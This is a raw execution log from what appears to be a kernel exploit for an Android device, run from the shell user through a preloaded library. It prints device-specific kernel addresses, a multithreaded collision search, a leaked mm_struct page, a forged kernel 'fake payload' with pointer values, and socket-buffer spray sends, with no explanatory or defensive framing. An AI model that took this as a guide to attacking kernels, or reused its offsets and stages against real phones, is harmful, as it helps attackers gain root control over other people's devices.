===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788945140.txt pid=9852 uid=2000
1788945140.870 9852 [+] preload starting pid=9852
1788945140.870 9852 [+] startup context pid=9852 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788945140.871 9852 [+] build config pid=9852 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788945140.871 9852 [+] p0 profile pid=9852 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788945140.872 9852 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788945140.873 9852 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=f2c10c54-0ff1-4225-9352-23a14501e182 (odd attempts: leaked page scratch, even attempts: this alias)
1788945144.370 9852 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788945146.551 9852 [*] pile-up verified: approx_time=1301
1788945146.552 9852 [*] start finding collisisons
1788945146.553 9852 [*] target    000000707b2ba0c8
1788945168.964 9852 [*] [  3] tested 1900000 candidates, scanning=0xffffff986a06da00
1788945168.968 9852 [*] [  4] tested 1900000 candidates, scanning=0xffffffa06a06da00
1788945168.968 9852 [*] [  1] tested 1900000 candidates, scanning=0xffffff886a06da00
1788945168.971 9852 [*] [  6] tested 2000000 candidates, scanning=0xffffffb06f9b6cc0
1788945168.997 9852 [*] [  5] tested 1800000 candidates, scanning=0xffffffa864724740
1788945168.990 9852 [*] [  0] tested 2200000 candidates, scanning=0xffffff807ac48f00
1788945168.991 9852 [*] [  7] tested 1800000 candidates, scanning=0xffffffb864724740
1788945168.994 9852 [*] [  4] tested 2000000 candidates, scanning=0xffffffa06f9b6cc0
1788945168.995 9852 [*] [  1] tested 2000000 candidates, scanning=0xffffff886f9b6cc0
1788945168.997 9852 [*] [  3] tested 2000000 candidates, scanning=0xffffff986f9b6cc0
1788945168.999 9852 [*] [  6] tested 2100000 candidates, scanning=0xffffffb0752fff80
1788945169.001 9852 [*] [  5] tested 1900000 candidates, scanning=0xffffffa86a06da00
1788945169.002 9852 [*] [  0] tested 2300000 candidates, scanning=0xffffff80805921c0
1788945169.002 9852 [*] [  7] tested 1900000 candidates, scanning=0xffffffb86a06da00
1788945169.004 9852 [*] [  2] tested 1900000 candidates, scanning=0xffffff906a06da00
1788945169.019 9852 [*] [  7] thread done, tested 1900000 candidates
1788945169.005 9852 [*] [  4] tested 2100000 candidates, scanning=0xffffffa0752fff80
1788945169.013 9852 [*] [  1] tested 2100000 candidates, scanning=0xffffff88752fff80
1788945169.020 9852 [*] [  4] thread done, tested 2100000 candidates
1788945169.016 9852 [*] [  3] tested 2100000 candidates, scanning=0xffffff98752fff80
1788945169.021 9852 [*] [  1] thread done, tested 2100000 candidates
1788945169.017 9852 [*] [  6] tested 2200000 candidates, scanning=0xffffffb07ac48f00
1788945169.018 9852 [*] [  5] thread done, tested 1970035 candidates
1788945169.022 9852 [*] [  3] thread done, tested 2100000 candidates
1788945169.018 9852 [*] [  0] thread done, tested 2339687 candidates
1788945169.019 9852 [*] [  2] thread done, tested 1900000 candidates
1788945169.022 9852 [*] [  6] thread done, tested 2200000 candidates
1788945169.023 9852 [*] prepare_kernel_page leaked_mm=ffffff8082901a40 base=ffffff8082900000 mode=0
1788945169.024 9852 [*] fake payload mode=0 write_shape=0 lock=ffffff80829004d0 w0=ffffff80829013a0 task=ffffff8082902380 write_parent=ffffff8082900180 write_right=0000000000000000 write_left=ffffff8082902180
1788945169.029 9852 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
1788945169.030 9852 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
1788945169.031 9852 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
1788945169.032 9852 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
1788945169.033 9852 [*] done
